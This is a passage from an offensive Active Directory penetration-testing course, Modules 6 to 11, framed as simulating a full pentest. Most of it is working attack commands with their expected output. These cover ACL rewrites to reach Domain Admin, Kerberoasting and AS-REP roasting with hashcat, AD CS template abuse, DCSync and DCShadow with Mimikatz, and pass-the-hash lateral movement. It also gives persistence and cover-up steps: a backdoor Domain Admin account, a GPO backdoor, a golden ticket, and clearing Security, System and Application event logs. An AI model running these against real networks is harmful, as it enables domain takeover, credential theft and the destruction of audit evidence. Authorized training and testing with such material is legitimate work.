#### Scenario 2: Local Admin on Workstation  
- Dump cached creds → find DA creds → PtH/PtT → pivot.  
- Check LAPS → retrieve local admin password → pivot.  
- Check scheduled tasks → extract service creds → pivot.  

#### Scenario 3: Domain Admin  
- Already DA: focus on persistence (Module 11) and advanced credential theft (Module 9).  

### Common Pitfalls  
- LDAP returning stale computer accounts  
- SPNs on offline hosts  
- Misreading delegation flags  
- Trust direction confusion  

### Next Steps  
- **Module 6**: ACL Misconfiguration Deep Dive & Shadow Admin Discovery  

---

## <a name="module-6"></a> Module 6: ACL Misconfiguration Deep Dive & Shadow Admin Discovery

### Introduction  
Identify misconfigured ACLs on AD objects granting `GenericAll`, `GenericWrite`, or `WriteDACL` to low-priv principals—leading to “Shadow Admin” paths.

### Definitions  
1. **ACL (Access Control List)**: List of ACEs on an AD object.  
2. **ACE (Access Control Entry)**: Entry specifying principal, rights (`GenericAll`, `WriteDACL`, etc.), and inheritance.  
3. **GenericAll**: Full control over an object.  
4. **GenericWrite**: Write many attributes.  
5. **WriteDACL**: Modify the ACL itself.  
6. **DS-Replication-Get-Changes**: Privilege to perform DCSync.  
7. **Shadow Admins**: Principals not in DA but with ACL rights enabling DA elevation.

### Why It Matters  
- ACL misconfigs allow privilege escalation without credential cracking.  
- BloodHound visualizes these paths; manual checks confirm and exploit.

### Tools & Commands  

#### PowerShell  
- Get ACL on OU:  
  ```powershell
  $acl = Get-Acl "AD:OU=Admins,DC=corp,DC=local"
  $acl.Access | Select IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
  ```  
- Get ACL on Users container:  
  ```powershell
  $acl = Get-Acl "AD:CN=Users,DC=corp,DC=local"
  $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" }
  ```  

#### BloodHound  
- Collect data:  
  ```powershell
  Invoke-SharpHound -CollectionMethod ACL,Group,Session,LocalAdmin
  ```  
- In GUI: “Find Shortest Paths to Domain Admins”.

### Step-by-Step Guide  

#### 1. ACL on `OU=Admins`  
```powershell
$aclAdmins = Get-Acl "AD:OU=Admins,DC=corp,DC=local"
$aclAdmins.Access | Format-Table IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
```
**Expected Output**:  
```
IdentityReference        ActiveDirectoryRights    ObjectType                               InheritanceType
-----------------        ---------------------    ----------                               ---------------
CORP\HelpdeskOps         GenericWrite            bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
CORP\Domain Admins       GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
BUILTIN\Administrators   GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
```

- “HelpdeskOps” has GenericWrite on Admins OU → can modify any user in OU=Admins.

#### 2. ACL on `CN=Users`  
```powershell
$aclUsers = Get-Acl "AD:CN=Users,DC=corp,DC=local"
$aclUsers.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" } | Select IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
```
**Expected Output**:  
```
IdentityReference          ActiveDirectoryRights   ObjectType                               InheritanceType
-----------------          ---------------------   ----------                               ---------------
CORP\AuditGroup            WriteDacl               bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
CORP\Domain Admins         GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
BUILTIN\Administrators     GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
```

- “AuditGroup” has WriteDacl on Users container → can add itself or user to Domain Admins.

#### 3. BloodHound Path  
- Run “Find Shortest Paths to Domain Admins” for “HelpdeskOps” or “AuditGroup”.

### Exploit Examples  

#### HelpdeskOps → Admins OU → DA  
```powershell
# As HelpdeskOps member
$ouPath = "AD:OU=Admins,DC=corp,DC=local"
$acl = Get-Acl $ouPath
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\HelpdeskOps","GenericWrite","Allow", "bf967aba-0de6-11d0-a285-00aa003049e2")
$acl.AddAccessRule($rule)
Set-Acl -AclObject $acl $ouPath

# Modify DA user jsmith
$targetUser = "AD:CN=jsmith,CN=Users,DC=corp,DC=local"
$aclUser = Get-Acl $targetUser
$ruleUser = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\HelpdeskOps","GenericAll","Allow")
$aclUser.AddAccessRule($ruleUser)
Set-Acl -AclObject $aclUser $targetUser

# Reset password for jsmith
Set-ADAccountPassword -Identity jsmith -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
Enable-ADAccount -Identity jsmith
```
Now login as `corp\jsmith:P@ssw0rd!` → Domain Admin.

#### AuditGroup → Users Container → DA  
```powershell
$usersPath = "AD:CN=Users,DC=corp,DC=local"
$acl = Get-Acl $usersPath
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\AuditGroup","WriteDacl","Allow","bf967aba-0de6-11d0-a285-00aa003049e2")
$acl.AddAccessRule($rule)
Set-Acl -AclObject $acl $usersPath

# Now grant GenericAll on Domain Admins to AuditGroup
$daGroup = "AD:CN=Domain Admins,CN=Users,DC=corp,DC=local"
$aclDA = Get-Acl $daGroup
$ruleDA = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\AuditGroup","GenericAll","Allow")
$aclDA.AddAccessRule($ruleDA)
Set-Acl -AclObject $aclDA $daGroup
```
Now members of `AuditGroup` can add themselves to Domain Admins.

### Common Pitfalls  
- Checking only top-level OUs. Objects deeper may have misconfigs.  
- Not verifying inheritance.  
- Confusing `Deny` vs `Allow` ACEs.

### Next Steps  
- **Module 7**: Kerberoasting & AS-REP Roasting Attacks  

---

## <a name="module-7"></a> Module 7: Kerberoasting & AS-REP Roasting Attacks

### Introduction  
Perform offline cracking by requesting Kerberos service tickets (Kerberoast) or AS-REP for accounts without pre-auth.

### Definitions  
1. **TGT (Ticket-Granting Ticket)**: Proof of identity.  
2. **TGS (Ticket-Granting Service)**: Tickets for specific services.  
3. **Kerberoasting**: Requesting TGS for SPN; crack offline.  
4. **AS-REP Roasting**: Target accounts with `DONT_REQUIRE_PREAUTH`; crack AS-REP offline.  
5. **Hashcat Modes**:  
   - `13100`: Kerberos 5 TGS-REP (RC4)  
   - `13800`: Kerberos 5 TGS-REP (AES-128)  
   - `24100`: Kerberos 5 TGS-REP (AES-256)  
   - `18200`: Kerberos 5 AS-REP (RC4)  
   - `23800`: Kerberos 5 AS-REP (AES)

### Why It Matters  
- Offline cracking—no lockout.  
- Service account or AS-REP user cracked often yields elevated rights.

### Tools & Commands  

#### Impacket’s GetUserSPNs.py (Kerberoast)  
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/examples
python3 GetUserSPNs.py corp.local/jdoe:Password123 -request -outputfile spn_tickets.hash
```
- **Expected Output**:  
  ```
  [+] Getting SPNs
  [+] Requesting TGS for: SRV-SQL01$
  [+] Saving ticket to spn_tickets.hash
  ...
  ```

#### Crack with Hashcat  
```bash
hashcat -m 13100 spn_tickets.hash /path/to/wordlist.txt
```
- **Crack Output Example**:  
  ```
  svc_sql:Passw0rd!
  ```

#### Impacket’s GetNPUsers.py (AS-REP Roasting)  
```bash
python3 GetNPUsers.py corp.local/ -no-pass -outputfile asrep.hash
```
- **Expected Output**:  
  ```
  [+] svc_legacy@corp.local
  [+] Saved hash to asrep.hash
  ```
#### Crack AS-REP with Hashcat  
```bash
hashcat -m 18200 asrep.hash /path/to/wordlist.txt
```
- **Crack Output Example**:  
  ```
  svc_legacy:LegacyP@ss!
  ```

### Step-by-Step Guide  

#### 1. Check for AS-REP Roastable Accounts  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```
- **Expected Output**:  
  ```
  sAMAccountName: svc_legacy
  sAMAccountName: svc_oldjr
  ```
- **If Output Present**: Run `GetNPUsers.py`.  
- **Else**: Skip to Kerberoast.

#### 2. Kerberoasting  

1. **Identify SPNs**  
   ```bash
   ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=computer)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
   ```
   - **Expected Output**:  
     ```
     SRV-SQL01$
     SRV-SQL02$
     SRV-EX01$
     ```
2. **Run GetUserSPNs.py**  
   ```bash
   python3 GetUserSPNs.py corp.local/jdoe:Password123 -request -outputfile spn_tickets.hash
   ```
3. **Crack with Hashcat**  
   ```bash
   hashcat -m 13100 spn_tickets.hash /path/to/rockyou.txt
   ```
4. **Interpret**: Determine if cracked account is privileged.

#### 3. AS-REP Roasting  

1. **Run GetNPUsers.py**  
   ```bash
   python3 GetNPUsers.py corp.local/ -no-pass -outputfile asrep.hash
   ```
   - **Expected Output**:  
     ```
     [+] svc_legacy@corp.local
     [+] Saved hash
     ```
2. **Crack with Hashcat**  
   ```bash
   hashcat -m 18200 asrep.hash /path/to/rockyou.txt
   ```
3. **Interpret**: Check group membership of cracked account.

### Common Pitfalls  
- Wrong hashcat mode.  
- SPNs on offline hosts.  
- AS-REP accounts with expired passwords.

### Next Steps  
- **Module 8**: AD Certificate Services Enumeration & Abuses  

---

## <a name="module-8"></a> Module 8: AD Certificate Services Enumeration & Abuses

### Introduction  
Abuse misconfigured certificate templates to request certificates granting high-privilege authentication (PKINIT, DC authentication).

### Definitions  
1. **AD CS (Active Directory Certificate Services)**: Microsoft PKI solution.  
2. **Certificate Template**: Defines certificate properties and enrollment rights.  
3. **Enrollment Rights**: “Enroll” or “AutoEnroll” permissions on a template.  
4. **ESC Classes**: Attack categories (ESC1–ESC13).  
5. **PKINIT**: Kerberos extension for certificate-based authentication.

### Why It Matters  
- Misconfigured templates allow issuance of high-priv certificates to low-priv users → escalate to DA via PKINIT.

### Tools & Commands  

#### LDAP Queries  
- Find CA servers:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
  ```  
- List templates on CA:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
  ```  
- Enumerate all certificate templates and ACLs:  
  ```bash
  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor,msPKI-ExtendedKeyUsage,distinguishedName
  ```

#### PowerShell  
- List templates and enrollment permissions:  
  ```powershell
  $templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
  foreach ($t in $templates) {
    Write-Host "`nTemplate: $($t.Name)"
    $acl = Get-Acl ("AD:" + $t.distinguishedName)
    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
    }
  ```
- Check EKU:  
  ```powershell
  Get-ADObject -Identity "CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Properties msPKI-ExtendedKeyUsage
  ```

### Step-by-Step Guide  

#### 1. Find CA Servers  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Configuration,DC=corp,DC=local" "(objectCategory=pKIEnrollmentService)" dsServiceName,distinguishedName
```
**Expected Output**:  
```
dn: CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
dsServiceName: CORP-CA

dn: CN=Subordinate-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local
dsServiceName: Subordinate-CA
```

#### 2. List Certificate Templates on CA  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=CORP-CA,OU=CAs,CN=Enrollment Services,CN=Services,CN=Configuration,DC=corp,DC=local" certificateTemplates
```
**Expected Output**:  
```
certificateTemplates: Kerberos Authentication
certificateTemplates: DomainController
certificateTemplates: Computer
certificateTemplates: User
certificateTemplates: AuditAgent
```

#### 3. Enumerate Template ACLs  
```bash
ldapsearch -x -H ldap://DC01.corp.local -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" "(cn=*)" msPKI-EnrollmentFlag,securityDescriptor
```
**Expected Output (example)**:  
```
dn: CN=Kerberos Authentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=DomainController,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=Computer,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 65536
securityDescriptor:<…binary…>

dn: CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>

dn: CN=AuditAgent,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
msPKI-EnrollmentFlag: 16384
securityDescriptor:<…binary…>
```

#### 4. PowerShell: Check Enrollment Permissions  
```powershell
$templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties msPKI-EnrollmentFlag,distinguishedName
foreach ($t in $templates) {
    Write-Host "`nTemplate: $($t.Name)"
    $acl = Get-Acl ("AD:" + $t.distinguishedName)
    $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "Enroll" } | Format-Table IdentityReference,ActiveDirectoryRights,InheritanceType
}
```
**Expected Output**:  
```
Template: Kerberos Authentication
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object
BUILTIN\Administrators   GenericAll            (GUID)       Descendents,This Object

Template: DomainController
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Admins       GenericAll            (GUID)       Descendents,This Object

Template: Computer
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\Domain Users        ReadProperty,Enroll    (GUID)       Descendents,This Object
CORP\HelpdeskOps         Enroll                 (GUID)       Descendents,This Object

Template: User
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
AUTHENTICATED USERS      ReadProperty,Enroll    (GUID)       Descendents,This Object

Template: AuditAgent
IdentityReference        ActiveDirectoryRights ObjectType   InheritanceType
CORP\AuditGroup          Enroll                 (GUID)       Descendents,This Object
```

### Exploit Scenarios  

#### Scenario A: Safe Templates  
- AD CS restricted to DA only → skip AD CS attack.

#### Scenario B: “Computer” Template Enrollable by Domain Users  
- Request a computer certificate and use PKINIT to impersonate machine.  

#### Scenario C: Custom “AuditAgent” Template with Enrollment Agent Rights  
- As `AuditGroup`, request Enrollment Agent certificate.  
- Use it to enroll for DA certificate via CA (ESC6).

### Common Pitfalls  
- Misreading `msPKI-EnrollmentFlag`.  
- Missing EKU that allows PKINIT.  
- Overlooking custom templates.

### Next Steps  
- **Module 9**: DCSync, DCShadow & Advanced Credential Theft  

---

## <a name="module-9"></a> Module 9: DCSync, DCShadow & Advanced Credential Theft

### Introduction  
Use replication rights to dump all domain hashes (DCSync) or stealthily inject changes via DCShadow.

### Definitions  
1. **DCSync**: Abusing `DS-Replication-Get-Changes (All)` to replicate credentials from a DC.  
2. **DS-Replication-Get-Changes-All**: Privilege to read private attributes (password hashes).  
3. **DCShadow**: Register a rogue DC and push malicious changes into AD.  
4. **ntds.dit**: Database on DC containing AD objects and password hashes.  

### Why It Matters  
- DCSync: quick domain hash dump.  
- DCShadow: stealth backdoor insertion.

### Tools & Commands  

#### Mimikatz DCSync  
```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:corp.local /user:krbtgt
```
**Expected Output**: List of user hashes.

#### Impacket secretsdump.py  
```bash
python3 secretsdump.py corp.local/administrator@dc01.corp.local
```
**Expected Output**: Domain user hashes.

#### Mimikatz DCShadow  
```powershell
mimikatz.exe
privilege::debug
kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt
lsadump::dcshadow /push
```

### Step-by-Step Guide  

#### Scenario A: Have Replication Rights  
- Run DCSync with Mimikatz:  
  ```powershell
  mimikatz.exe 'lsadump::dcsync /domain:corp.local /user:krbtgt' 'exit'
  ```  
- **Expected Output**: All domain user hashes.

#### Scenario B: Exploit ACL on AdminSDHolder  
- Check ACL:  
  ```powershell
  $aclSDH = Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $aclSDH.Access | Where-Object { $_.ActiveDirectoryRights -match "WriteDacl" }
  ```  
- **If “ShadowGroup” has WriteDACL**:  
  ```powershell
  $path = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $acl = Get-Acl $path
  $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\ShadowGroup","ExtendedRight","Allow","00000000-0000-0000-0000-000000000012")
  $acl.AddAccessRule($rule)
  Set-Acl -AclObject $acl $path
  ```
- Now members of `ShadowGroup` have replication rights. Perform DCSync.

#### Scenario C: DCShadow Attack  
- Generate Golden Ticket for rogue DC:  
  ```powershell
  Mimikatz.exe 'kerberos::golden /user:corp\DCShadow1$ /domain:corp.local /sid:S-1-5-21-... /krbtgt:7c6a180b36896a0a8c02787eeafb0e4c /id:11223344 /groups:512 /ptt'
  ```
- Register Rogue DC and push changes:  
  ```powershell
  mimikatz.exe 'lsadump::dcshadow /push'
  ```

### Common Pitfalls  
- Running DCSync on RODC fails.  
- Using wrong GUID for `DS-Replication-Get-Changes`.  
- Forgetting to test effective rights for ACL modifications.

### Next Steps  
- **Module 10**: Lateral Movement & Privilege Escalation  

---

## <a name="module-10"></a> Module 10: Lateral Movement & Privilege Escalation

### Introduction  
Pivot across hosts using PtH/PtT, WinRM, PSExec, etc., and escalate local privileges to further domain compromise.

### Definitions  
1. **PtH (Pass-the-Hash)**: Use NTLM hash to authenticate without password.  
2. **PtT (Pass-the-Ticket)**: Inject Kerberos tickets into session.  
3. **Over-Pass the Hash**: Use NTLM hash in Kerberos flow (AS-REP).  
4. **WinRM**: Windows Remote Management protocol (PowerShell Remoting).  
5. **PSExec**: Tool for remote command execution.  
6. **DCOM**: Distributed COM for remote execution.  

### Why It Matters  
- Move to critical servers (file servers, AD CS, etc.) and escalate to DA if not yet.

### Tools & Commands  

#### PtH (Mimikatz)  
```powershell
mimikatz.exe 'sekurlsa::pth /user:corp\jsmith /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe'
```
- Then connect remote:  
  ```powershell
  Enter-PSSession -ComputerName WS002 -Credential corp\jsmith
  ```

#### PtT (Mimikatz)  
```powershell
mimikatz.exe 'kerberos::ptt TGT.kirbi'
```
- Check:  
  ```powershell
  klist
  ```
- Then SMB:  
  ```powershell
  net use \\WS002\C$ 
  ```

#### Over-Pass the Hash (Rubeus)  
```powershell
Rubeus.exe asktgt /user:corp\jsmith /aes256:HASH /domain:corp.local /dc:DC01.corp.local /ptt
```

#### Remote Execution  

- **WinRM**:  
  ```powershell
  Enable-PSRemoting -Force
  Enter-PSSession -ComputerName WS002.corp.local -Credential corp\jsmith
  ```
- **PSExec**:  
  ```powershell
  psexec \\WS002.corp.local -u corp\jsmith -p 'Password123' cmd.exe
  ```
- **DCOM (Impacket)**:  
  ```bash
  dcomexec.py corp\jsmith:Password123@10.0.0.20
  ```

### Step-by-Step Guide  

#### Scenario A: SMB Share Movement  
- Enumerate shares:  
  ```powershell
  net view \\WS002.corp.local
  ```
- Map share:  
  ```powershell
  net use Z: \\WS002.corp.local\C$ /user:corp\jsmith Password123
  ```

#### Scenario B: WMI Service Enumeration  
```powershell
Get-WmiObject -Class Win32_Service -ComputerName WS002.corp.local | Where { $_.StartName -like "corp\svc_*" } | Select Name,StartName
```

#### Scenario C: Scheduled Tasks  
```powershell
Invoke-Command -ComputerName WS002.corp.local -ScriptBlock {
  Get-ScheduledTask | Where { $_.Principal.UserId -like "corp\*" } | Select TaskName,Principal.UserId
}
```

### Common Pitfalls  
- SMB blocked by firewall.  
- Lacking local admin even with domain creds.  
- DCOM disabled.

### Next Steps  
- **Module 11**: Persistence & Cleanup  

---

## <a name="module-11"></a> Module 11: Persistence & Cleanup

### Introduction  
After achieving DA, establish persistence and clean up evidence.

### Definitions  
1. **SIDHistory**: Maintains old SIDs after migration—can be abused.  
2. **Golden Ticket**: Forged TGT enabling persistent KDC authentication.  
3. **Silver Ticket**: Forged service ticket.  
4. **GPO Backdoor**: Malicious GPO linked to maintain persistence.  
5. **Event Log Manipulation**: Clearing Windows logs to cover tracks.

### Why It Matters  
- Persistence ensures access; cleanup reduces detection.

### Tools & Commands  

#### Backdoor DA Account  
```powershell
New-ADUser -Name "svc_persistence" -SamAccountName "svc_persistence" -AccountPassword (ConvertTo-SecureString "P3rs1st!" -AsPlainText -Force) -Enabled $true -Path "CN=Users,DC=corp,DC=local"
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence"
```

#### Protect with AdminSDHolder  
```powershell
$sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
$acl = Get-Acl $sdhPath
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule("corp\svc_persistence","GenericAll","Allow")
$acl.AddAccessRule($rule)
Set-Acl -AclObject $acl $sdhPath
```

#### GPO Backdoor  
```powershell
New-GPO -Name "Corp-Backdoor" -Comment "Backdoor GPO"
Set-GPRegistryValue -Name "Corp-Backdoor" -Key "HKLM:\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0" -ValueName "Script" -Type String -Value "powershell -Command `"Add-LocalGroupMember -Group 'Administrators' -Member 'corp\svc_persistence'`"
New-GPLink -Name "Corp-Backdoor" -Target "DC=corp,DC=corp,DC=local" -Enforced Yes
```

#### Golden Ticket  
```powershell
Mimikatz.exe 'kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500 /groups:512 /ptt'
```

#### Cleanup  
- **Clear Event Logs**:  
  ```powershell
  Invoke-Command -ComputerName DC01.corp.local -ScriptBlock {
    wevtutil cl Security
    wevtutil cl System
    wevtutil cl Application
  }
  ```  
- **Remove Backdoor Account**:  
  ```powershell
  Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_persistence" -Confirm:$false
  Remove-ADUser -Identity "svc_persistence"
  ```  
- **Revert AdminSDHolder ACL**:  
  ```powershell
  $sdhPath = "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local"
  $acl = Get-Acl $sdhPath
  $ace = $acl.Access | Where-Object { $_.IdentityReference -eq "corp\svc_persistence" }
  $acl.RemoveAccessRule($ace)
  Set-Acl -AclObject $acl $sdhPath
  ```  
- **Remove GPO**:  
  ```powershell
  Remove-GPO -Name "Corp-Backdoor" -Confirm:$false
  ```

### Common Pitfalls  
- Deleting your own rights prematurely.  
- Clearing only partial logs.  
- Leaving GPO links dangling.

---

## <a name="roadmap"></a> Roadmap Summary

1. **Module 1**: Introduction to AD  
2. **Module 2**: Enumerating Users, Groups & Privileged Accounts  
3. **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
4. **Module 4**: Identifying Built-In Groups & Default Security Settings  
5. **Module 5**: Enumerating Computers, SPN Delegation & Trust Relationships  
6. **Module 6**: ACL Misconfiguration Deep Dive & Shadow Admin Discovery  
7. **Module 7**: Kerberoasting & AS-REP Roasting Attacks  
8. **Module 8**: AD Certificate Services Enumeration & Abuses  
9. **Module 9**: DCSync, DCShadow & Advanced Credential Theft  
10. **Module 10**: Lateral Movement & Privilege Escalation  
11. **Module 11**: Persistence & Cleanup  

By following each module, you simulate a full AD pentest, ending in Domain Admin.
